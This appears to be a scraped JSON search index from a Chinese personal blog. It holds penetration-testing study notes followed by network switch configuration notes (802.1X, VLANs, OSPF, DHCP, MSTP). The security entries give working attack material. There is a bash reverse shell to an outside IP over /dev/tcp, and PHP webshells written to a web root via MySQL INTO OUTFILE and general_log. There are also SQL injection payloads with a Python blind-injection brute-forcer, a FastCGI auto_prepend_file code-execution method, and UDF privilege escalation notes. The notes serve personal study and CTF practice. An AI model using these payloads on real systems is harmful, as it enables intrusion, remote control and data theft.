万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用find / -name &quot;*.php&quot;来全局搜索一下默认环境： 找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如/usr/local/lib/php/PEAR.php。 任意代码执行那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？ 理论上当然是不可以的，即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。 但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。 auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。 那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include） 那么，我们怎么设置auto_prepend_file的值？ 这又涉及到PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中） 所以，我们最后传入如下环境变量： 123456789101112131415161718{ 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': &quot;localhost&quot;, 'SERVER_PROTOCOL': 'HTTP/1.1' 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On'} 设置auto_prepend_file = php://input且allow_url_include = On，然后将我们需要执行的代码放在Body中，即可执行任意代码。 效果如下： EXP编写上图中用到的EXP，就是根据之前介绍的fastcgi协议来编写的，代码如下：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 。兼容Python2和Python3，方便在内网用。 之前好些人总是拿着一个GO写的工具在用，又不太好用。实际上理解了fastcgi协议，再看看这个源码，就很简单了。 EXP编写我就不讲了，自己读代码吧。","link":"/TechnicalExperience/Penetration/fastcgi.html"},{"title":"数据库反弹shell的几种方式","text":"反弹shell: 将已经获取控制权的机器返回一个shell给外部机器 反弹BASH在外部机器执行的指令 1nc -l {端口} nc 可以用来连接到端口通信，用法是 nc [host] [port]， 也可以启动本机的port进行监听，使用-l参数 在需要反弹机器的数据库里执行指令 1system bash -c 'bash -i &amp;&gt; /dev/tcp/{外部机器IP}/{端口} &lt;&amp;1' 解读指令： 从左到右进行解读，system 是数据库用来执行系统指令的，bash就不多说了，说一下他的参数。 -c: 代表command，后面接命令字符串，主要是为了防止其他shell的干扰 -i: 交互式shell &amp;&gt;: 将标准输出和错误进行重定向 /dev/tcp/ip/port: bash建立socket的一种特殊写法，除此之外还有udp &lt;&amp;1: 把标准输入重定向到标准输出, 其他写法 0&gt;&amp;1 WebShell方法一 目标机器开启80端口且PHP为后端 数据库的全局变量 secure_file_priv 值为空，不能为NULL(不能输出文件)，如果有路径代表只能输出到该路径 1234567MariaDB root@(none):(none)&gt; show variables like '%secure%'| Variable_name | Value ||--------------------------|---------|| require_secure_transport | OFF || secure_auth | ON || secure_file_priv | || secure_timestamp | NO | 数据库用户有输出文件权限 1select group_concat(user,0x3a,file_priv) from mysql.user; 数据库(mysql)对 $_SERVER[‘DOCUMENT_ROOT’] 有写入权限 对http服务根目录输出webshell 1select &quot;&lt;?php @system($_GET['cmd']);?&gt;&quot; into outfile '/srv/http/houmen.php'; 方法二如果上面的 secure_file_priv 规定了输出目录或者是NULL，还可以使用 general_log 的方法来写shell，general_log可以记录所有基础日志，默认关闭 模糊查找关于general的信息 12345MariaDB root@(none):(none)&gt; show variables like '%general%'| Variable_name | Value ||------------------|------------------|| general_log | OFF || general_log_file | | 开启general_log，设置路径 1234567MariaDB root@(none):(none)&gt; set global general_log = 1;MariaDB root@(none):(none)&gt; set global general_log_file = '/srv/http/hm.php';MariaDB root@(none):(none)&gt; show variables like '%general%'| Variable_name | Value ||------------------|------------------|| general_log | ON || general_log_file | /srv/http/hm.php | 写入数据 1MariaDB root@(none):(none)&gt; select &quot;&lt;?php @eval($_GET['command']);?&gt;&quot; 12345❯ sudo cat /srv/http/hm.php /usr/bin/mariadbd, Version: 10.5.9-MariaDB (Arch Linux). started with:Tcp port: 3306 Unix socket: /run/mysqld/mysqld.sockTime Id Command Argument210429 17:29:36 3 Query select &quot;&lt;?php @system($_GET['cmd']);?&gt;&quot; 关于服务器权限的问题： 在我的MANJARO系统里，httpd的用户是http，mariadb的用户是mysql，默认情况下，会存在mysql无法写入，httpd无法读取的情况 这些漏洞在windows上可能可以实现 总结后端只要满足三个条件就可以反弹shell 支持 tcp 链接 支持 IO 重定向 可以调用系统命令 参考文章 常见数据库写入Webshell汇总 bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1 的含义","link":"/TechnicalExperience/Penetration/reverse-shell.html"},{"title":"sql盲注笔记","text":"什么是盲注？在sql注入点输入sql语句不回显任何数据，只返回了网页处理的结果（使用布尔盲注），甚至不返回结果（设置数据库查询时间，时间盲注） 盲注是非常繁琐的，需要不断的更改url进行判断，可以用BP的intruder模块配合或者编程（直到我发现了sqlmap） 布尔盲注进行布尔盲注一定要分清楚报错的条件，比如有的是数据为空、语句报错时报错，有的只是语句报错时才报错。 判断流程?id=1 and 's'='p' 如果报错错则可以使用 and 爆破 爆破方法(payload) ?id=1 and 构造出想要的数据 =/like 猜想的数据 ?id = if(构造出想要的数据 =/like 猜想的数据, 1, (select table_name from information_schema.tables)) tips：false 的的输出必须是 1 column，否则语句报错 获取数据库名目前先使用python进行爆破 1234567891011121314151617181920212223242526272829303132333435363738394041#! /usr/bin/env python# _*_ coding:utf-8 _*_import requestsimport sysimport stringimport timesession = requests.session() # 访问该网站的其他页面时使用一样的cookie, 保持会话url = &quot;http://localhost:10000/?id=&quot;success_flag = '' # 查询正确页面标志def database_name(): time_start = time.time() name = '' flag = True while flag: pos = 1 old_pos = 0 # 判断是否结束 for asc_str in list(string.ascii_lowercase)+list('_'): payload1 = &quot;if(substr(database(),%d,1) = '%s',1,(select table_name from information_schema.tables))&quot; % ( pos, asc_str) #payload2 = &quot;1 and substr(database(),%d,1) = '%s'&quot; % ( # pos, asc_str) result = requests.get(url+payload1) if success_flag in result.text: name += asc_str old_pos = pos pos += 1 break if old_pos+1 != pos: flag = False time_end = time.time() print('Database name : {}\\nNumber of characters: {}\\nTime cost : {}'.format( name, pos, time_end-time_start)) return nameif __name__ == '__main__': database_name() 从注入点得到当前数据库的表数 使用BP暴出数据库的名字（一个字母一个字母的暴破） 爆破该数据库第一张表的名字(也是一个字母一个字母) 12345?id=1' and (select table_name from information_schema.tables where table_schema = database() limit 0,1) like 'u%' --+ 时间盲注如果连网页处理结果都不给的话，还可以设置数据库查询时间进行盲注 比如下面这个页面，不管输入什么都显示一个样 利用时间注入，当sql语句运行成功时延时2s 123?id=1' and if(left(database(),1)='x', sleep(2), 0)--+ 进BP的intruder模块进行爆破 可以看到响应2s的是开头为s的url，所以数据库的首字母为s 注意：因为没有错误提醒，所以一定要注意在url里sql语法上的问题","link":"/TechnicalExperience/Penetration/sql-injection-blind.html"},{"title":"常用SQL注入方法总结","text":"网上资料过于繁杂，所以想写一篇文章记录我的收获 判断是否存在注入点一般来说都是输入sql语句，报错就很有可能存在注入点 字符型注入和数字注入这两个的区别就是一个需要引号，一个不需要 字符型：?id=2' 其他语句# 数字型：?id=2 其他语句 如何判断？ 数字型的其他语句替换为 and 1=2 会报错，否则就是字符型 url编码问题网址都是采用url编码，一般浏览器网址栏的字符都会被自动转码，但需要注意几点 末尾的空格不会被转码 #不会被转码（# url 编码后是 %23 ） 注释问题在字符型注入中，需要闭合引号构造sql语句，可以使用两个符号 #：在#后面的语句都会被注释掉 --：使用时需要注意，后面一定要接一个空格，在使用中都是 --+，+是空格的url编码 其他问题表的字段类型如果是数字类型也可以用 '数字'来表示，但如果是数字＋字母的组合，只会取开头为数字的部分 1234＃比如下面的写法查询结果一样where id='123abc'where id='123'where id=123 技巧找到注入点以后，如果该注入点会返回查询的的数据，就可以着手获取数据库的基本信息了 如果没有返回数据，考虑报错注入和盲注 判断查询字段数 order by：表示根据第几字段排序，超出会报错 12MariaDB sqlilabs@(none):security&gt; select * from users where id=1 order by 4(1054, &quot;Unknown column '4' in 'order clause'&quot;) select into：原意是备份表，可备份全部字段或者部分字段，into 后面跟新表。表可以用变量@来表示，几个变量代表几个字段，运行报错就代表不是该字段数，字段数正确不会报错，但是前端得不到数据，会报500错误。（除了＠，也可以用null） 该方法可用在limit后面 union：union字段数，类型不兼容，则会报错，利用这个原理猜字段数，不报错就说明猜对了 请注意这是查询的字段数，不一定等于表的字段数，后端逻辑可能是查询全部字段然后进行筛选 获取数据库名1?id=1 and 1=2 union select 1,database() 获取数据库的表1?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema='sqli' 获取表的字段1?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' 获取该字段下的所有数据1?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag 绕过输出一行的逻辑前端的逻辑可能获取到第一行数据后就把 后面的数据（我想要获取的数据）丢掉，可以让他第一行查不出来，这样就会显示我想显示的数据 报错注入当后端sql运行正确时不会返回数据，而错误才会返回信息，这时就可以利用错误的信息将数据库的信息暴露出来 方法一： 利用 group by 子句的原理，配合count，floor和rand(产生两个随机值相撞的概率大)使其报错．(group by虚拟表[count(*), key]，rand重复计算插入后报错) 获取数据库名 1?id=1 union select 1,count(*),concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+ 缺点：数据库的记录必须&gt;1才有几率报错。 方法二： 利用extractvalue()函数 1?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))--+ 参考文章 【技术分享】MySQL 注入攻击与防御 Web安全学习笔记","link":"/TechnicalExperience/Penetration/sql-injection.html"},{"title":"隐写秘籍","text":"隐写术是将秘密数据隐藏在普通的、非秘密的文件或消息中以避免被发现的技术；然后再目的地提取秘密数据。隐写术的使用可以与加密相结合，作为隐藏或保护数据的额外步骤。隐写术这个词来源于希腊词steganos（意思是隐藏或覆盖）和希腊词graph（意思是写）。 隐写术虽然是在CTF中听到的名字，但实际上已经不是第一次用了，曾经逛迹于各大论坛用过几次图种😅，表面是图，改成rar后缀解压就是torrent😆，emm其实我也只是听说而已…..ok，现在来了解一些常见的隐写方法，我将会以如何隐藏，如何解开为思路进行学习 图片中的秘密所需知识： 基本图片格式(bmp，jpg/jfif，png，gif…)的文件格式 工具： cat vim hexdump binwalk … 将数据插入图片末尾jpg/jfif 只会识别到结束标识FFD9，png 则是*49 45 4e 44 ae 42 60 82 * 利用该原理，可以将各种数据插入图片末尾，常见的有 jpg/png+text jpg/png+rar(rar不规定开头标识，通过更改后缀可直接在两个文件进行转换) 等等 字符隐写制作： 123456echo 'text' &gt; test.jpg## 或者使用vim编辑二进制vim -b file.name# 指令ga可查看当前字符信息# 指令:%!xxd进入16进制编辑模式(%表示所有行)# 修改16进制后使用:%!xxd -r返回成二进制 查看方法：使用能解析二进制的工具即可 文件隐写制作： 1cat test.png file &gt; test.png 解析：binwalk能解析这类特殊文件里的特殊标识，-e选项就能分离这些文件 LSB隐写最低有效位隐写，更改图片某个像素点的最低位为隐藏的消息位，可实现字符串隐写和小图隐写。因为是更改了图片的像素点，所以采用有损压缩的图片格式就会丢失隐写的信息(比如jpg..) 小图隐写的解析方式需要使用Stegsolve工具对每个通道值的8个plane值进行二值化 字符隐写需要使用编程语言或工具将每个图片的最低位收集起来转换成ASCII码 P.S.：目前没有找到很好的进行LSB写入的工具，只能使用编程语言代替下了，python EXIF隐写exif可以记录数码照片的属性信息和拍摄数据，在linux端使用exiftool查看和编辑 GIF文件gif支持多帧动画，可以将数据隐写在一个极短的帧里面 Stegsolve支持将gif解帧（Analyse－Frame Brower） P.S.：有一些题会将GIF头给删除，需要自己加上…最新的标准是89a，头为GIF89a 图片宽高修改png图片IHDR头中的高宽可以隐藏图片的一部分，IHDR后面的第一个字节是宽，第二个字节是高，后面还有crc校验码 利用crc校验码可以破解该图的原始宽高，例如下面一个python代码就是根据crc暴力破解原始宽高 1234567891011121314151617181920212223242526272829# 代码来源https://www.jianshu.com/p/0b5d14657d2eimport zlibimport struct#读文件file = '2.png' fr = open(file,'rb').read()data = bytearray(fr[12:29])crc32key = eval(str(fr[29:33]).replace('\\\\x','').replace(&quot;b'&quot;,'0x').replace(&quot;'&quot;,''))print(crc32key)n = 4095 #理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了for w in range(n):#高和宽一起爆破 width = bytearray(struct.pack('&gt;i', w))#q为8字节，i为4字节，h为2字节 for h in range(n): height = bytearray(struct.pack('&gt;i', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] #print(data) crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) #写文件 newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+'.png','wb')#保存副本 fw.write(newpic) fw.close P.S.：linux修改后无法读取图片(校验码不对)，虽然修改校验码可以显示，但这张图片的破解难度估计就有点大（靠猜？）；windows可以显示修改后的图片","link":"/TechnicalExperience/Penetration/steganography.html"},{"title":"工具集合","text":"收集工具和整理用法 arpspoofdnsspoofdriftnetdirsearchsqlmaphexdump1234❯ echo '/lib_mysqludf_sys_64.so'| hexdump -C00000000 2f 6c 69 62 5f 6d 79 73 71 6c 75 64 66 5f 73 79 |/lib_mysqludf_sy|00000010 73 5f 36 34 2e 73 6f 0a |s_64.so.|0000001 burp suite教程：感谢t0大佬 一款全平台集成型的渗透测试工具 hackbar[chrome插件] 方便手工SQL注入 Proxy SwitchyOmega[chrome插件] 切换代理很方便 ExifTool各种文件的元数据查看和更改工具（比如隐写） Binwalk是一款快速、易用，用于分析，逆向工程和提取固件映像的工具。 简单易用，完全自动化脚本，并通过自定义签名，提取规则和插件模块，还重要一点的是可以轻松地扩展。 在CTF的MISC类题型和IOT安全的固件解包分析中广泛应用，可以大大提高效率。","link":"/TechnicalExperience/Penetration/tools.html"},{"title":"udf提权","text":"UDF 即 User Defined Funtion，通过udf提权可以用来把数据库root用户权限转化为数据库管理员（mysql）的权限，在windows里面可能就获取到了系统管理员的权限 国光大佬的文章写的很棒，贴个链接方便以后自己复习哈哈，这里记录自己踩的坑 MANJARO的mariadb动态链接库在/usr/lib/mysql/plugin/下，用户是root，连数据库管理员都不能写入 刚开始以为是将mysql的权限提为root，后来想想，linux的root这么好提？实践后才发现原来是有了mysql的权限，我太自作多情 参考文章 MySQL 漏洞利用与提权","link":"/TechnicalExperience/Penetration/udf.html"},{"title":"交换机认证配置","text":"关于802.1x, radius, aaa等 802.1X 802.1X是IEEE LAN/WAN 委员会为了解决基于端口的网络接入控制（Port-Based Network Access Control）而定义的一个标准，该标准目前已经在无线局域网和以太网中被广泛应用。 概述802.1X验证涉及到三个部分 申请者: 客户端设备 验证者: 网络设备, 如交换机或者无线接入点 验证服务器: 支持RADIUS和EAP(Extensible Authentication Protocol)的主机 申请者向验证者提供凭据，如用户名/密码或者数字证书，验证者将凭据转发给验证服务器来进行验证． 如果验证服务器认为凭据有效，则申请者（客户端设备）就被允许访问被保护侧网络的资源 在验证者PAE(端口访问实体)与RADIUS服务器之间，可以使用两种认证方式来交换信息。一种是EAP协议报文使用EAPOR（EAP over RADIUS）封装格式承载于RADIUS协议中；另一种是EAP协议报文由接入控制单元PAE进行终结，采用包含PAP（Password Authentication Protocol，密码验证协议）或CHAP（Challenge Handshake Authentication Protocol，质询握手验证协议）属性的报文与RADIUS服务器进行认证交互 认证方式 认证过程可以由客户端主动发起，也可以由设备端发起。一方面当设备端探测到有未经过认证的用户使用网络时，就会主动向客户端发送EAP-Request/Identity 报文，发起认证；另一方面客户端可以通过客户端软件向设备端发送EAPOL-Start 报文，发起认证。 802.1x系统支持EAP 中继方式和EAP 终结方式与远端RADIUS 服务器交互完成认证 EAP终结方式与EAP中继方式的认证流程相比，不同之处在于用来对用户密码信息进行加密处理的随机加密字由设备端生成，之后接入控制单元会把用户名、随机加密字和客户端加密后的密码信息一起送给RADIUS 服务器，进行相关的认证处理 下面是对中继和终结方式扩展出的三种优化认证模式 基于端口 基于MAC 基于用户(IP+mac+端口, 可防止ARP欺骗) 交换机最大认证用户数：user-based用户数为ipv4支持700，ipv6支持1400；mac-based和交换机的限速值相关，最大可以达到4000人，推荐使用认证用户数不超过2000人 常用配置 全局配置模式 作用 dot1x enable 打开全局dot1X dot1x user free-resource &lt;ip&gt; 未认证能访问的有限资源 端口模式 作用 dot1x guest-vlan &lt;vlanID&gt; 设置guest vlan `dot1x port-method {macbased portbased `dot1x port-control {auto force-authorized 配置RADIUS服务器12345678910# 配置认证服务器Switch(config)#radius-server authentication host 10.1.1.3# 配置计费服务器Switch(config)#radius-server accounting host 10.1.1.3# Configure authentication and encryption keySwitch(config)#radius-server key &lt;0|7&gt; key# 配置认证服务器需要Switch(config)#aaa enable# 配置计费服务器需要Switch(config)#aaa-accounting enable AAA与radius AAA(Authentication,Authorization and Accounting认证、授权和计费), 它提供了网络安全管理的一致性框架,该框架通过认证、授权和计费三大功能满足了安全网络的访问控制需求: 哪些用户可以访问网络设备,访问用户拥有哪些访问权限以及用户使用网络资源的统计计费。 RADIUS(Remote Authentication Dial-In User Service 远程认证拨号用户服务)是一种分布式的、客户端/服务器结构的信息交互协议。RADIUS客户端一般在网络设备上启用,与802.1x协议结合实现认证、授权和计费的所有主要功能,而RADIUS服务器负责维护用户认证、授权和计费信息数据库,通过RADIUS协议与客户端进行通信,完成用户认证和授权信息的下发以及计费信息的统计。RADIUS协议是实现AAA框架的一种协议。","link":"/Internet-equipment/DCN/CS6200-28X-EI/Authentication.html"},{"title":"交换机基础配置","text":"记录一些实用的用法, 我的环境是Version 7.5.3.2(R0004.0030) vlan 全局 作用 show vlan vlan brief interface ethernet &lt;interface-list&gt; 进入一个或多个VLAN, 不连续用 ;, 连续用 - 默认VLAN是可以互相通信的(自动启用路由功能) telnet12345678# 配置用户username &lt;username&gt; [privilege &lt;privilege&gt;] password (0 | 7) &lt;password&gt;# 开启服务telnet-server enable# 启用ACLauthentication line vty login local# 启用该IP作为安全IPauthentication securityip &lt;ip-addr&gt; show users可查看telnet和ssh登录的用户 http1ip http server ssh1234# 生成密钥ssh-server host-key create rsa modulus &lt;768-2048&gt;# 开启服务ssh-server enable 神州交换机的ssh版本有点老, 自带的ssh客户端可能连不上, 需要加一些参数 ssh 登录旧设备的问题解决 SVI 没有cisco的no switchport指令, 将接口加入vlan就行了 目标: 让两台三层交换机下不同VLAN的PC互联 PC1: 1sudo route add -net 192.168.20.0 netmask 255.255.255.0 gw 192.168.10.1 ip: 192.168.10.2 gw: 192.168.10.1 PC2: ip: 192.168.20.2 gw: 192.168.20.1 S1: vlan10: 192.168.10.1/24 vlan2: 192.168.2.1/24 S2: vlan20: 192.168.20.1/24 vlan2: 192.168.2.2/24 123456789101112131415S1(config)#vlan 10S1(config-vlan10)#vlan 2 S1(config-vlan2)#switchport interface S1(config-vlan2)#switchport interface ethernet 1/0/3S1(config-vlan2)#exitS1(config)#interface vlan 2S1(config-if-vlan2)#ip address 192.168.2.1 255.255.255.0S1(config-if-vlan2)#exit S1(config)#interface vlan 10S1(config-if-vlan10)#ip address 192.168.10.1 255.255.255.0S1(config-if-vlan10)#exitS1(config)#interface ethernet 1/0/1S1(config-if-ethernet1/0/1)#switchport mode access S1(config-if-ethernet1/0/1)#switchport access vlan 10S1(config)#ip route 192.168.20.0 255.255.255.0 192.168.2.2 1234567891011121314S2(config)#vlan 20S2(config-vlan20)#exitS2(config)#interface vlan 20S2(config-if-vlan20)#ip address 192.168.20.1 255.255.255.0S2(config-if-vlan20)#exitS2(config)#vlan 2S2(config-vlan2)#exitS2(config)#interface vlan 2S2(config-if-vlan2)#ip address 192.168.2.2 255.255.255.0S2(config-if-vlan2)#exitS2(config)#ip route 192.168.10.0 255.255.255.0 192.168.2.1S2(config)#interface ethernet 1/0/3S2(config-if-ethernet1/0/3)#switchport mode access S2(config-if-ethernet1/0/3)#switchport access vlan 2 RIPv2与思科 RIP.md 基本一致 show ip route rip显示RIP network的路由 show ip protocol查看RIP详情 OSPFv2 v2适用于IPv4, v3适用于IPv6 相同的域共享相同的LSDB 0代表主干域 OSPF的区域以Backbone（骨干区域）作为核心，该区域标识为0域，所有的其他区域都必须与0域在逻辑上相连，0域必须保证连续。 12345678910111213141516171819202122232425S1(config)#router ospf S1(config-router)#network 192.168.10.0/24 area 0S1(config-router)#network 192.168.2.0/24 area 0 S1(config-router)#show ip ospf route O 192.168.2.0/24 [1] is directly connected, Vlan2:192.168.2.1, Area 0.0.0.0 tag:0O 192.168.10.0/24 [1] is directly connected, Vlan10:192.168.10.1, Area 0.0.0.0 tag:0S2(config)#router ospfS2(config-router)#network 192.168.2.0/24 area 0Apr 16 20:00:56:000 2021 S1 DEFAULT/7/:[OSPF]Neighbor [Vlan2:192.168.2.1-192.168.20.1]: Status change Loading -&gt; FullsS2(config-router)#network 192.168.20.0/24 area 0S2(config-router)#show ip routeCodes: K - kernel, C - connected, S - static, R - RIP, B - BGP O - OSPF, IA - OSPF inter area N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2 E1 - OSPF external type 1, E2 - OSPF external type 2 i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area * - candidate defaultC 127.0.0.0/8 is directly connected, Loopback tag:0C 192.168.2.0/24 is directly connected, Vlan2 tag:0O 192.168.10.0/24 [110/2] via 192.168.2.1, Vlan2, 00:00:30 tag:0C 192.168.20.0/24 is directly connected, Vlan20 tag:0Total routes are : 4 item(s) DHCP123456789101112131415# 配置S1(config)#ip dhcp pool &lt;pool_name&gt;S1(dhcp-manu-config)#network-address 192.168.10.1 24# gwS1(dhcp-manu-config)#default-router 192.168.10.1S1(dhcp-manu-config)#exit# 启用S1(config)#service dhcp# 中继(设置其他DHCP服务器)# config启用转发DHCP报文ip forwark-protocol udp bootps# 在接口设置转发地址interface vlan_idip helper-address dhcp_server_ip 若设置多个pool时, 如不指定中继, 则会获得同一网段的pool的支持 DHCPv6需要在接口指定IP pool ipv6 dhcp server &lt;poolname&gt; [preference&lt;value&gt;] [rapid-commit] [allow-hint] DHCP侦听作用是屏蔽接入网络中的非法的DHCP服务器。即开启 DHCP Snooping 功能后，网络中的客户端只有从管理员指定的DHCP服务器获取IP地址。 由于DHCP报文缺少认证机制，如果网络中存在非法DHCP服务器，管理员将无法保证客户端从管理员指定的DHCP服务器获取合法地址，客户机有可能从非法DHCP服务器获得错误的IP地址等配置信息，导致客户端无法正常使用网络。 建议将连接DHCP服务器的端口设置为信任端口，其他端口设置为非信任端口。 12345S1(config)#ip dhcp snooping enable # 记录非法信息S1(config)#ip dhcp snooping blocked record enable# 信任口S1(config-if-ethernet1/0/1)#ip dhcp snooping trust 加密123S2(config)#service password-encryptionshow runusername test password 7 098f6bcd4621d373cade4e832627b4f6 RIPng 运行在IPv6的RIP协议 123456789101112S1(config)#router ipv6 rip S1(config-router)#exit S1(config)#interface vlan 10S1(config-if-vlan10)#ipv6 address 2021:4:17:10::1/64# 在该接口运行RIPng，类似IPv4的networkS1(config-if-vlan10)#ipv6 router ripS1(config-if-vlan10)#interface vlan 2S1(config-if-vlan2)#ipv6 address 2021:4:17:2::1/64S1(config-if-vlan2)#ipv6 router rip 端口隔离利用端口隔离的特性，可以实现vlan内部的端口隔离 配置端口隔离功能后，一个隔离组内的端口之间相互隔离, 不同隔离组和不属于隔离组的端口可以互相访问 一台交换机上最多能够配置16个隔离组 全局模式下 作用 isolate-port group &lt;WORD&gt; 创建隔离组 `isolate-port group switchport interface [ethernet port-channel] ` show isolate-port group [ &lt;WORD&gt; ] 显示端口隔离的相关配置 端口环路检测当交换机的端口接收到一个自己发送出去的报文时, 对其进行处理, 与STP有点类似 但与STP并不冲突, 端口环路检测针对一个端口, STP是全局 全局模式下 作用 loopback-detection interval-time &lt;loopback&gt; &lt;no-loopback&gt; 设置环路检测的时间间隔 oopback-detection control-recovery timeout &lt;0-3600&gt; 配置环路检测受控方式是否自动恢复或者恢复的时间间隔 端口模式下 作用 loopback-detection specified-vlan &lt;vlan-list&gt; 开启端口环路检测 `loopback-detection control {shutdown block}` 端口镜像 端口镜像功能是指交换机把某一个端口接收或发送的数据帧完全相同的复制给另一个端口；其中被复制的端口称为镜像源端口，复制的端口称为镜像目的端口 流镜像功能是指交换机把端口的指定规则的接收的数据帧完全复制给一个端口，其中指定规则只有为permit时流镜像才能生效 全局模式下 作用 `monitor session source {interface } {rx tx monitor session &lt;session&gt; destination interface &lt;interface-number&gt; 指定目标 `monitor session source {interface } access-group {rx tx 12345S3(config)#monitor session 1 source interface ethernet1/0/1 ? access-list 访问列表 both 管理发送和接收的流量 rx 只管理接收的流量 tx 只管理发送的流量","link":"/Internet-equipment/DCN/CS6200-28X-EI/Basic.html"},{"title":"DCP-debugging","text":"DCP(Dynamic CPU Protection)动态CPU防护, 当检测到具有某种特定源IP的报文上CPU的速率超过一定的速率值时, 将对该类报文进行限速处理。 全局配置模式 作用 dcp enable 开启DCP dcp limit-rate &lt;20-50&gt; 设置限速(对所用IP) dcp no-limit-ip &lt;ip_addr&gt; 设置不限速的IP","link":"/Internet-equipment/DCN/CS6200-28X-EI/DCP-debugging.html"},{"title":"MSTP","text":"了解MSTP, 在CS6200上进行配置 简介 它应用RSTP的快速收敛特性，允许多个具有相同拓扑的VLAN映射到一个生成树实例上，而这个生成树拓扑同其它生成树实例相互独立。这种机制一方面用多重生成树实例为映射到它的VLAN的数据流量提供了独立的发送路径，实现不同实例间VLAN数据流量的负载分担；另一方面，若干个VLAN共享同一个拓扑实例（MSTI），同每个VLAN对应一个生成树（PVST）的实现方法相比，大大减少了每个网桥需要维持的生成树实例的数量，节约了CPU资源 MSTP把一个交换网络划分成多个域，每个域内形成多棵生成树，生成树之间彼此独立。每棵生成树叫做一个多生成树实例MSTI（Multiple Spanning Tree Instance），每个域叫做一个MST域（MST Region：Multiple Spanning Tree Region） 域用来解决如何判断某个VLAN映射到哪个生成树实例的问题 在同一个MST域（MST Region）必须满足以下条件 都启动了MSTP 域名（Region Name） 修订级别（Revision Level） 格式选择器（Configuration Identifier FormatSelector） VLAN与实例的映射关系（mapping of VIDs to spanning trees）… VLAN映射表： VLAN映射表是MST域的属性，它描述了VLAN和MSTI之间的映射关系 在BPDU里是一个摘要, 该摘要是根据映射关系计算得到的一个16字节签名 CST 公共生成树CST（Common Spanning Tree）是连接交换网络内所有MST域的一棵生成树。 如果把每个MST域看作是一个节点，CST就是这些节点通过STP或RSTP协议计算生成的一棵生成树。 IST 内部生成树IST（Internal Spanning Tree）是各MST域内的一棵生成树。 IST是一个特殊的MSTI，MSTI的ID为0，通常称为MSTI0。 IST是CIST在MST域中的一个片段。 SST 运行STP或RSTP的交换设备只能属于一个生成树。 MST域中只有一个交换设备时，这个交换设备构成单生成树。 CIST 所有MST域的IST+CST即构成了一个完整的生成树, 即CIST 总根 总根是CIST（Common and Internal Spanning Tree）的根桥。 域根 域根（Regional Root）分为IST域根和MSTI域根。 一个MST域内可以生成多棵生成树，每棵生成树都称为一个MSTI。MSTI域根是每个多生成树实例的树根。 主桥 主桥（Master Bridge）也就是IST Master，它是域内距离总根最近的交换设备。 端口角色 根端口、指定端口、Alternate端口、Backup端口和边缘端口的作用同RSTP协议中定义。 除边缘端口外，其他端口角色都参与MSTP的计算过程。 同一端口在不同的生成树实例中可以担任不同的角色。 所谓”实例”就是多个VLAN的一个集合。在MSTP中，各个实例拓扑的计算是独立的，一个MSTP实例单独计算一棵生成树，在这些实例上就可以实现负载均衡。使用的时候可以把多个相同拓扑结构的VLAN映射到同一个实例中，这些VLAN在端口上的转发状态将取决于对应实例在MSTP里的转发状态。 端口角色 STP需要做两件事情：选举根桥、确定端口角色。 外部与内部路径开销ExtRPC＆IntRPC外部路径开销是相对于CIST而言的，同一个域内外部路径开销是相同的；内部路径开销是域内相对于某个实例而言的，同一端口对于不同实例对应不同的内部路径开销。 域边缘端口域边缘端口是指位于MST域的边缘并连接其它MST域或SST的端口 Alternate端口Alternate端口是根端口的备份端口，如果根端口被阻塞后，Alternate端口将成为新的根端口 Backup端口当同一台交换机的两个端口互相连接时就存在一个环路，此时交换机会将其中一个端口阻塞，Backup端口就是被阻塞的那个端口。 从转发用户流量来看，Backup端口，作为指定端口的备份 Master端口Master端口是MST域和总根相连的所有路径中最短路径上的端口，它是交换机上连接MST域到总根的端口。Master端口是域中的报文去往总根的必经之路。 Master端口是特殊域边缘端口，Master端口在IST/CIST上的角色是Root Port，在其它各实例上的角色都是Master。 配置 我只用3个交换机测试, 所以只有一个域 即CIST=IST CIST总根=IST域根 1234# 开启生成树(默认mstp), 开启后才能设置其他mode域spanning-tree# 查看show spanning-tree 拓扑&lt;暂时未画..&gt; 各交换机参数如下(改过S1的优先级): 